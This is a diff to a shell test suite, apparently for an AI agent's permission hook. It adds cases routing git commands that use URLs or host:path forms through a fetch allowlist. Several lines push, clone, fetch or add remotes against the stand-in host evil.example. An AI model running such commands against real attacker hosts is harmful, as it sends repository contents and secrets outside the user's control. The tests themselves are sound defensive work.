@@ -121,6 +121,21 @@ sh_ ask  'caffeinate -t 5 curl https://x'
 sh_ none 'env -u HOME ls'
 sh_ none 'find . -name x -print'
 sh_ none 'flock /tmp/l make test'
+
+# --- git with a URL or host:path goes through the WebFetch allowlist (S3); remote names pass
+sh_ ask  'git push https://evil.example/x.git HEAD'
+sh_ ask  'git -C /x fetch git@evil.example:o/r.git'
+sh_ ask  'git remote add ex https://evil.example/r'
+sh_ ask  'git remote set-url --push origin evil.example:r'
+sh_ ask  'git submodule add https://evil.example/r'
+sh_ ask  'git ls-remote ssh://evil.example/r'
+sh_ ask  'cd x && git clone https://evil.example/r'
+sh_ none 'git push origin HEAD:main'
+sh_ none 'git push'
+sh_ none 'git fetch origin'
+sh_ none 'git clone ../local'
+sh_ none 'git pull file:///tmp/r'
+sh_ none 'git push https://developer.mozilla.org/x'
 check none "Read payload" "$(hook '{"tool_name":"Read","tool_input":{"file_path":"/x"}}')"
 check none "Edit payload" "$(hook '{"tool_name":"Edit","tool_input":{"file_path":"/x"}}')"
 check ask  "python3 missing" "$(fetch https://developer.mozilla.org/x \
